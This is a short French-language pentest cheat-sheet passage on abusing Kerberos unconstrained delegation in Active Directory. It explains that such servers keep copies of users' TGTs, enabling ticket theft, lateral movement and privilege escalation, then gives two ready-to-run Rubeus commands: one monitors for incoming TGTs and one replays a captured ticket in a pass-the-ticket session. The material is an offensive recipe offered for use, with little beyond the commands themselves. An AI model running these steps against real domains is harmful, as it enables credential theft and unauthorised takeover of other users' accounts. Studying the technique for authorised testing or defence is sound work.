
> [!TIP]
> 
> Dans le cas d'un service classique, n'importe qui accédant au service va utiliser un TGS qui sera stocké en mémoire sur la machine cible. Dans le cas d'une délégation non contrainte, la machine cible va stocker une copie du TGT de l'utilisateur en plus. Cela permet donc le vol des TGT Kerberos et la latéralisation vers n'importe quel autre service.
> 
> Par exemple si j'ai compromis un partage SMB SHARE01 qui a une délégation non contrainte, alors n'importe qui accédant au partage SMB va envoyer son TGS et une copie de son TGT au serveur, me permettant de latéraliser et élever mes privilèges.

> [!TIP]
> Nécessite le privilege SeDebug afin d'accéder aux tickets en mémoire.


1. Lancer Rubeus en mode monitor, puis attendre que les TGT arrivent

```powershell
.\Rubeus.exe monitor /nowrap
```

2. Une fois le TGT cible capturé, faire un Pass The Ticket dans un nouveau process

```powershell
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET]
```
